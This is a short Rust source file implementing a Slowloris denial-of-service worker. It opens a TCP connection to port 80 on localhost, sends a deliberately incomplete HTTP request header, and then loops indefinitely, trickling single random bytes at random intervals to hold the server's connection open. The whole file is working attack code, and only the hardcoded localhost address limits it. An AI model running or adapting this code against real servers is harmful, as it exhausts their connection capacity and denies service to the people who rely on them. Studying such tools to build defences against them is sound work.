use rand::rngs::SmallRng;
use rand::{FromEntropy, Rng};
use std::io::{Error, Write};
use std::net::TcpStream;
use std::thread;
use std::time::Duration;

pub struct SlowlorisWorker {
    id: u8,
    sleep_time: u8,
    stream: TcpStream,
}

impl SlowlorisWorker {
    pub fn new(id: u8, sleep_time: u8) -> Result<SlowlorisWorker, Error> {
        let mut stream = TcpStream::connect("127.0.0.1:80")?;
        stream.write_all("GET / HTTP/1.1\r\nUser-Agent: slowloris\r\n".as_bytes())?;

        Ok(SlowlorisWorker {
            id,
            sleep_time,
            stream,
        })
    }

    pub fn start(&mut self) {
        let mut rng = SmallRng::from_entropy();

        loop {
            thread::sleep(Duration::from_secs(rng.gen_range(0, self.sleep_time) as u64));
            match &self.stream.write_all(&rng.gen::<[u8; 1]>()) {
                Ok(_) => println!("[slowloris_{:02}] Update sent.", self.id),
                Err(_) => println!("[slowloris_{:02}] Update failed.", self.id),
            }
        }
    }
}
